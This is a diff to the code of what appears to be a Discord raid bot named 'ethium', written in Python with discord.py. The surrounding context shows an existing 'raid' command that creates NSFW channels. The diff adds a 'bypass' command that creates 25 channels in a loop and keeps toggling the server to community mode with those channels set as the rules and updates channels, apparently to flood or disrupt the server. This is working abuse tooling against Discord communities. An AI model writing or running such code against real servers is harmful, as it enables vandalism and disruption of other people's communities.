@@ -68,8 +68,9 @@ def rewrite_config() -> Dict[str, str]:
         for line in data:
             del line
 
-    config = get_config() or prompt()
-    return config
+        config = prompt()
+        return config
+    return get_config()
 
 
 def prompt() -> Dict[str, str]:
@@ -283,6 +284,19 @@ async def raid(ctx: cmds.Context) -> None:
             channels_name, nsfw=True
         )
         log.info(f'Created channel {channel}')
+
+
+@ethium.command(
+    name='bypass',
+    description='soon',
+)
+async def bypass(ctx: cmds.Context) -> None:
+    guild: discord.Guild = ctx.guild
+    for _ in range(25):
+        channel: discord.TextChannel = await guild.create_text_channel(channels_name)
+        await guild.edit(
+            community=True, rules_channel=channel, public_updates_channel=channel
+        )
 
 
 @ethium.command(
